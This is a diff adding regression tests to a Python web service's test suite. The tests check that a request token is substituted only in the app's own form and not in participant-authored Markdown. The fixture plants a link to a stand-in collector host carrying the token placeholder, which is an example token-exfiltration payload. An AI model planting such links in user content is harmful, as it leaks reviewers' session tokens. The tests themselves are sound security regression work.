@@ -31,6 +31,7 @@ from quest_app.serve import (
     create_server,
     is_service_running,
 )
+from quest_app.view_models import online_service_view
 
 
 @pytest.fixture
@@ -1493,3 +1494,75 @@ class TestTheProbeAsksAboutThisRepository:
         assert not is_service_running(elsewhere), (
             "a different clone's service answered on the port and was believed"
         )
+
+
+class TestTheTokenSubstitutionIsScopedToOwnFormMarkup:
+    """Round 14 E8.
+
+    `_serve_static` used to replace `__GTQ_REQUEST_TOKEN__` anywhere it appeared in served
+    HTML, which included participant-authored PROOF.md — sanitised Markdown, but Markdown a
+    participant controls, rendered on the evidence and reviewer pages. A participant who
+    quoted the placeholder in a link's URL got the live request token substituted into that
+    link, which a reviewer clicking it would send off the machine. The application's own
+    hidden `token` input is the only place this string should ever become the live token.
+    """
+
+    PROOF_PATH = "evidence/jira-read-assigned-stories/jira-attempt-001/PROOF.md"
+
+    @pytest.fixture
+    def service_with_a_planted_link(self, config: AppConfig) -> Iterator[tuple[str, str]]:
+        proof = config.participant_root / self.PROOF_PATH
+        proof.write_text(
+            proof.read_text(encoding="utf-8")
+            + "\n\nSee [the board](http://example.invalid/collect?t=__GTQ_REQUEST_TOKEN__).\n",
+            encoding="utf-8",
+        )
+
+        bound = AppConfig.for_repo(
+            config.repo_root, participant_root=config.participant_root, service_port=0
+        )
+        report = ProblemReport()
+        world = load_world(bound, report)
+        assert world is not None, report.to_text()
+        # `online_service_view()` so the page renders a real form (a live token field) to
+        # check the fix did not also break — the state a participant would actually see
+        # while `make serve` runs.
+        build_site(world, service=online_service_view())
+
+        server, state = create_server(bound)
+        port = server.server_address[1]
+        thread = threading.Thread(target=server.serve_forever, daemon=True)
+        thread.start()
+        try:
+            yield f"http://127.0.0.1:{port}", state.token
+        finally:
+            server.shutdown()
+            server.server_close()
+            thread.join(timeout=5)
+
+    def test_the_live_token_never_reaches_a_participant_authored_link(
+        self, service_with_a_planted_link: tuple[str, str]
+    ) -> None:
+        base, token = service_with_a_planted_link  # secret-scan: allow
+        with urllib.request.urlopen(  # noqa: S310 - fixed loopback URL built in this test
+            f"{base}/evidence/jira-read-assigned-stories/", timeout=10
+        ) as response:
+            body = response.read().decode()
+
+        assert f"collect?t={token}" not in body, "the live token leaked into rendered content"
+        assert "collect?t=__GTQ_REQUEST_TOKEN__" in body, (
+            "the placeholder should be left inert in participant content, not stripped"
+        )
+
+    def test_the_service_s_own_form_still_carries_the_live_token(
+        self, service_with_a_planted_link: tuple[str, str]
+    ) -> None:
+        """The scoped substitution must not have broken the one place it belongs."""
+        base, token = service_with_a_planted_link  # secret-scan: allow
+        with urllib.request.urlopen(  # noqa: S310 - fixed loopback URL built in this test
+            f"{base}/evidence/jira-read-assigned-stories/", timeout=10
+        ) as response:
+            body = response.read().decode()
+
+        assert f'value="{token}"' in body
+        assert 'value="__GTQ_REQUEST_TOKEN__"' not in body
